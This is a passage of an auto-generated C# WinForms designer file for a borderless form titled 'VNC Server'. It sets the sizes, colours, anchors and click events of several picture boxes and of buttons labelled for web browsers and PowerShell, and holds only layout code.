            this.guna2PictureBox8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox8.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox8.ImageRotate = 0F;
            this.guna2PictureBox8.Location = new System.Drawing.Point(647, 796);
            this.guna2PictureBox8.Name = "guna2PictureBox8";
            this.guna2PictureBox8.ShadowDecoration.Parent = this.guna2PictureBox8;
            this.guna2PictureBox8.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox8.TabIndex = 269;
            this.guna2PictureBox8.TabStop = false;
            this.guna2PictureBox8.UseTransparentBackground = true;
            // 
            // guna2PictureBox5
            // 
            this.guna2PictureBox5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox5.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox5.ImageRotate = 0F;
            this.guna2PictureBox5.Location = new System.Drawing.Point(799, 796);
            this.guna2PictureBox5.Name = "guna2PictureBox5";
            this.guna2PictureBox5.ShadowDecoration.Parent = this.guna2PictureBox5;
            this.guna2PictureBox5.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox5.TabIndex = 270;
            this.guna2PictureBox5.TabStop = false;
            this.guna2PictureBox5.UseTransparentBackground = true;
            // 
            // btnOperaNeon
            // 
            this.btnOperaNeon.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnOperaNeon.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnOperaNeon.BorderThickness = 1;
            this.btnOperaNeon.CheckedState.Parent = this.btnOperaNeon;
            this.btnOperaNeon.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnOperaNeon.CustomImages.Parent = this.btnOperaNeon;
            this.btnOperaNeon.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btnOperaNeon.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btnOperaNeon.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnOperaNeon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnOperaNeon.DisabledState.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnOperaNeon.DisabledState.ForeColor = System.Drawing.Color.Gray;
            this.btnOperaNeon.DisabledState.Parent = this.btnOperaNeon;
            this.btnOperaNeon.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnOperaNeon.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnOperaNeon.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnOperaNeon.ForeColor = System.Drawing.Color.White;
            this.btnOperaNeon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnOperaNeon.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnOperaNeon.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnOperaNeon.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnOperaNeon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnOperaNeon.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnOperaNeon.HoverState.Parent = this.btnOperaNeon;
            this.btnOperaNeon.Location = new System.Drawing.Point(349, 792);
            this.btnOperaNeon.Name = "btnOperaNeon";
            this.btnOperaNeon.ShadowDecoration.Parent = this.btnOperaNeon;
            this.btnOperaNeon.Size = new System.Drawing.Size(110, 27);
            this.btnOperaNeon.TabIndex = 271;
            this.btnOperaNeon.Text = "O Neon";
            this.btnOperaNeon.Click += new System.EventHandler(this.btnOperaNeon_Click);
            // 
            // btnIE
            // 
            this.btnIE.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnIE.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnIE.BorderThickness = 1;
            this.btnIE.CheckedState.Parent = this.btnIE;
            this.btnIE.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnIE.CustomImages.Parent = this.btnIE;
            this.btnIE.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btnIE.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btnIE.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnIE.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnIE.DisabledState.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnIE.DisabledState.ForeColor = System.Drawing.Color.Gray;
            this.btnIE.DisabledState.Parent = this.btnIE;
            this.btnIE.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnIE.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnIE.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnIE.ForeColor = System.Drawing.Color.White;
            this.btnIE.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnIE.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnIE.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnIE.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnIE.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnIE.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnIE.HoverState.Parent = this.btnIE;
            this.btnIE.Location = new System.Drawing.Point(349, 823);
            this.btnIE.Name = "btnIE";
            this.btnIE.ShadowDecoration.Parent = this.btnIE;
            this.btnIE.Size = new System.Drawing.Size(110, 27);
            this.btnIE.TabIndex = 272;
            this.btnIE.Text = "IExplorer";
            this.btnIE.Click += new System.EventHandler(this.btnIexplore_Click);
            // 
            // guna2PictureBox9
            // 
            this.guna2PictureBox9.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox9.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox9.ImageRotate = 0F;
            this.guna2PictureBox9.Location = new System.Drawing.Point(685, 796);
            this.guna2PictureBox9.Name = "guna2PictureBox9";
            this.guna2PictureBox9.ShadowDecoration.Parent = this.guna2PictureBox9;
            this.guna2PictureBox9.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox9.TabIndex = 273;
            this.guna2PictureBox9.TabStop = false;
            this.guna2PictureBox9.UseTransparentBackground = true;
            // 
            // guna2PictureBox10
            // 
            this.guna2PictureBox10.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox10.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox10.ImageRotate = 0F;
            this.guna2PictureBox10.Location = new System.Drawing.Point(837, 796);
            this.guna2PictureBox10.Name = "guna2PictureBox10";
            this.guna2PictureBox10.ShadowDecoration.Parent = this.guna2PictureBox10;
            this.guna2PictureBox10.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox10.TabIndex = 274;
            this.guna2PictureBox10.TabStop = false;
            this.guna2PictureBox10.UseTransparentBackground = true;
            // 
            // VNCForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.ClientSize = new System.Drawing.Size(1039, 891);
            this.Controls.Add(this.guna2PictureBox10);
            this.Controls.Add(this.guna2PictureBox9);
            this.Controls.Add(this.btnIE);
            this.Controls.Add(this.btnOperaNeon);
            this.Controls.Add(this.guna2PictureBox5);
            this.Controls.Add(this.guna2PictureBox8);
            this.Controls.Add(this.guna2PictureBox7);
            this.Controls.Add(this.guna2PictureBox6);
            this.Controls.Add(this.guna2PictureBox4);
            this.Controls.Add(this.guna2PictureBox3);
            this.Controls.Add(this.guna2PictureBox2);
            this.Controls.Add(this.guna2PictureBox1);
            this.Controls.Add(this.btnOpera);
            this.Controls.Add(this.btnComodo);
            this.Controls.Add(this.btnWaterfox);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.guna2ControlBox3);
            this.Controls.Add(this.guna2ControlBox2);
            this.Controls.Add(this.guna2ControlBox1);
            this.Controls.Add(this.picTitleIcon);
            this.Controls.Add(this.btn360);
            this.Controls.Add(this.btnPalemoon);
            this.Controls.Add(this.guna2GradientButton4);
            this.Controls.Add(this.guna2GradientButton5);
            this.Controls.Add(this.btnBrave);
            this.Controls.Add(this.btnEdge);
            this.Controls.Add(this.btnFirefox);
            this.Controls.Add(this.btnStartL);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.btnPowershell);
            this.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ForeColor = System.Drawing.Color.LightGray;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximumSize = new System.Drawing.Size(1039, 891);
            this.MinimumSize = new System.Drawing.Size(1039, 891);
            this.Name = "VNCForm";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "VNC Server";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.VNCForm_FormClosing);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.VNCForm_FormClosed);
            this.Load += new System.EventHandler(this.VNCForm_Load);
            this.MouseDown += new System.Windows.Forms.MouseEventHandler(this.VNCForm_MouseDown);
            this.panel1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picTitleIcon)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox8)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox10)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
